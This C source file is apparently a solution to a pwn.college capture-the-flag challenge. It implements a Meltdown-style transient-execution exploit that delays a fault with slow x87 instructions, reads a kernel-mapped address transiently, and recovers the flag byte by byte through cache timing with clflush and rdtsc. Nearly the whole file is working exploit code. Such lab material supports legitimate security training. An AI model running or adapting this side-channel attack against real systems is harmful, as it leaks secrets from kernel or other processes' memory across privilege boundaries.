#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <semaphore.h>
#include <x86intrin.h>

#include "solve.h"

#define LET_STDOUT 1

#define FLAG_ADDRESS 0x404060
#define FLAG_PREFIX "pwn.college"
#define FLAGLEN  59 

#define START 32
#define END 0x7f
#define for_each_char(var) for (int var = START; var < END; var++)

static jmp_buf jbuf;
static struct page_data* page_ptr;

int threshold = THRESHOLD;
int dev_fd = -1;

size_t measure(void* ptr)
{
    register void* reg_ptr asm("rdi") = ptr;
    size_t start, end;
    _mm_lfence();

    start = __rdtsc();
    _mm_lfence();
    asm volatile("mov r8, qword ptr [%0]"
                :
                : "r" (reg_ptr)
                : "r8"
                );
    _mm_lfence();
    end   = __rdtsc();

    return end - start;
}

static inline __attribute__((always_inline)) void slow_segfault(void)
{
    // we need a seq of slow and dependent instruction 
    // so that we win the microcode race to the target
    asm volatile(
        "mov r14, 0x1337;"
        "push r14;"
        "fild QWORD PTR [rsp];"
        "fsqrt;"
        "fistp QWORD PTR [rsp];"
        "pop r14;"
        "mov r14, [r14]" // segfault
    );
}

// !!!DANGEROUS!!!
void spec_exploit1(size_t target_addr, struct page_data* mem) 
{
    register void* ptr asm("rbx") = mem;
    register void* target asm("rdi") = (void*) target_addr;

    slow_segfault();

    asm volatile(
        "xor rcx, rcx;"
        "mov cl, BYTE PTR [%0];"
        "shl rcx, 12;"
        "add %1, rcx;"
        "mov %1, [%1];"
        :
        : "r" (target), "r" (ptr)
        : "rcx"
    );
}

void spec_exploit(size_t target_addr, struct page_data* mem) 
{
    asm volatile(
        "lea rbx, [%0];"
        "xor rcx, rcx;"

        // slow op
        "mov rax, 0x1337;"
        "push rax;"
        "fild  QWORD PTR [rsp];"
        "fsqrt;"
        "fistp QWORD PTR [rsp];"
        "pop rax;"
        "mov rax, [rax];" // segfault
                         
        // exploit
        "mov cl, BYTE PTR [%1];"
        "shl rcx, 12;"
        "add rbx, rcx;"
        "mov rbx, [rbx];"
        :
        : "r" (mem),"r" (target_addr)
        : "rcx", "rbx", "rax"
    );
}

void flush_pages(struct page_data* ptr)
{
    for (int i = 0; i <= MAX; i++)
        _mm_clflush(&ptr[i]);
}

void perform_exploit(addr_t addr, size_t hits[MAX], struct page_data* mem, 
                     measure_data_t get_mesurments)
{
    for (int _ = 0; _ < REPEAT; _++)
    {
        if (!setjmp(jbuf)) {
            flush_pages(mem);
            COMM_TOUCH(addr);
            spec_exploit1(addr, mem);
        }

        get_mesurments(hits);
    }
}

void sigfault_handler(int signo) {
    longjmp(jbuf, 1); 
}

void get_timing_data(size_t hits[END]);
int process_data(size_t hits[END], size_t i);
int exec_challenge(char** argv, pid_t* pid);

int main(int argc, char** argv)
{
    char flag[FLAGLEN] = {0};
    pid_t victim_pid;


    struct sigaction sigsegv_act = {0};
    sigsegv_act.sa_handler = sigfault_handler;
    sigsegv_act.sa_flags = SA_NODEFER;
    if (sigaction(SIGSEGV, &sigsegv_act, NULL) < 0) {
        perror("signal");
        exit(1);
    }

    page_ptr = MMAP_MEM((END + 1) * PAGE_SIZE);
    if (page_ptr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    dev_fd = open("/proc/pwncollege", O_RDWR);
    if (dev_fd < 0) {
        perror("open");
        exit(1);
    }

    exec_challenge(argv, &victim_pid);
    struct ioctl_data ioctld = {0};
    ioctld.pid = victim_pid;
    COMM_GET(&ioctld);
    printf("pid: %#x; task struct ptr: %p\n", victim_pid, ioctld.task_struct);

    if (allocate_mmap_mem() < 0) {
        perror("mmap");
        exit(1);
    }
    
    addr_t flag_addr = get_kernel_address(ioctld.task_struct, FLAG_ADDRESS);
    printf("flag addr: %#lx\n", flag_addr);
    getchar();

AGAIN:
    for (int i = 0; i < FLAGLEN; i++)
    {
        size_t hits[END] = {0};
        perform_exploit(flag_addr+i, hits, page_ptr, get_timing_data);
        flag[i] = process_data(hits, i);
        if (flag[i]) {
            printf("\n\n - %c with hits of %zu - \n\n", flag[i], hits[flag[i]]);
        }
        else --i;
    }

    printf("flag: %s\n", flag);
    if (memcmp(flag, FLAG_PREFIX, sizeof FLAG_PREFIX-1))
        goto AGAIN;
}

void get_timing_data(size_t hits[END])
{
    for_each_char(j)
    {
        volatile int mix_j = ((j * j) * 2);
        mix_j = ( mix_j / j ) ^ 1;
        mix_j ^= 1;
        mix_j /= 2;

        size_t time = measure(&page_ptr[mix_j]);
        if (time <= threshold)
            hits[mix_j] += 1;
    }
}

int process_data(size_t hits[END], size_t i)
{
    size_t max_hits = 0;
    int ch = 0;
    for_each_char(j)
    {
        size_t hit = hits[j];
        if (hit)
            printf("%2zu/%3d (%c) - hits: %ld\n", i, j, j, hit);
        if (hit && max_hits < hit) {
            max_hits = hit;
            ch = j;
        }
    }

    return ch;
}

int exec_challenge(char** argv, pid_t* pid)
{
    int pipes[2];
    pipe(pipes);

    pid_t pid_ret = fork();
    if (pid_ret < 0) {
        perror("fork");
        exit(1);
    }

    if (pid_ret) {
        close(pipes[0]);
        if (pid)
            *pid = pid_ret;
        return pipes[1];
    }

    close(pipes[1]);
    if (dup2(pipes[0], STDIN_FILENO) != STDIN_FILENO) {
        perror("dup2");
        exit(242);
    }

    if (!LET_STDOUT) {
        int fd = open("/dev/null", O_WRONLY);
        if (fd < 0) {
            perror("open /dev/null");
            exit(1);
        }

        if (dup2(fd, STDOUT_FILENO) != STDOUT_FILENO) {
            perror("dup2");
            exit(1);
        }
        close(fd);
    }

    close(pipes[0]);
    execvp(argv[1], &argv[1]);

    perror("execv");
    exit(243);
}

